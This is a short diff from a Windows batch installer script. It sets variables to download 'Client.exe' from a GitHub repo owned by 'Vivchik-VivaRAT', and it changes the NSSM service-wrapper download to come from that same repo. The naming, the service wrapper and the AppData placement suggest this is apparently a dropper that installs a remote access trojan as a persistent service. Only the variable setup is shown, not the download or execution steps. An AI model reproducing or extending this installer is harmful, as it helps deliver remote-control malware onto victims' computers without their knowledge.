@@ -5,7 +5,7 @@ REM Установка переменных
 set "REPO_OWNER=Vivchik-VivaRAT"
 set "REPO_NAME=install"
 set "CLIENT_NAME=Client.exe"
-set "NSSM_URL=https://nssm.cc/release/nssm-2.24.zip"
+set "NSSM_URL=https://github.com/Vivchik-VivaRAT/install/raw/refs/heads/main/nssm-2.24.zip"
 set "CLIENT_URL=https://raw.githubusercontent.com/%REPO_OWNER%/%REPO_NAME%/main/%CLIENT_NAME%"
 set "TEMP_DIR=%TEMP%\setup_%RANDOM%"
 set "APPDATA_CLIENT=%APPDATA%\%CLIENT_NAME%"
